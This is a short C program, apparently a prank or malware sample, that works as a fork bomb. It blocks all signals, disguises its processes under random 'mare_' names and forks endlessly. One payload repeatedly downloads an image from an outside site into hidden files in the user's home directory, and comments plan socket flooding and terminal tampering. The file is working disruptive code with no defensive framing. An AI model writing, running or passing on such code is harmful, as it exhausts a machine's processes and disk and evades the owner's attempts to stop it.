#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <unistd.h>

void	random_pname() {
	FILE *fp = fopen("/dev/urandom", "r");
	char *str = malloc(16);
	fread(str, 1, 15, fp);
	str[0] = 'm';
	str[1] = 'a';
	str[2] = 'r';
	str[3] = 'e';
	str[4] = '_';
	prctl(PR_SET_NAME, str);
	fclose(fp);
	free(str);
}

// mlp ascii art
// curl luigi
// listen to literally all available sockets
// mess with stty

void	capmedaddy() {

}

void	filefuckery() {

}

void	luigme() {
	while (1) {
		system("curl 'https://ih0.redbubble.net/image.433724851.6990/flat,550x550,075,f.u3.jpg' > ~/.luigi$(date | awk '{print $4}') 2>/dev/null");
	}
}

void	thing();

static void (*g_bois[])(void) = {
	capmedaddy,
	filefuckery,
	luigme,
};

int forkyboi() {
	int		pid;
	int		sid;
	pid = fork();
	if (pid < 0)
		exit(1);
	if (pid > 0) {
		printf("PARENT PROCESS\n");
		g_bois[rand() % (sizeof(g_bois) / sizeof(*g_bois))]();
	}
	sid = setsid();
	if (sid < 0)
		exit(1);

	random_pname();

	thing();
	return (0);
}

void	thing() {
	sigset_t	mask;

	srand(time(NULL));

	random_pname();
	sigfillset(&mask);
	sigprocmask(SIG_SETMASK, &mask, NULL);	// ignore signals

	forkyboi();
}

int main(int argc, char **argv) {
	(void)argc;
	(void)argv;
	thing();
}

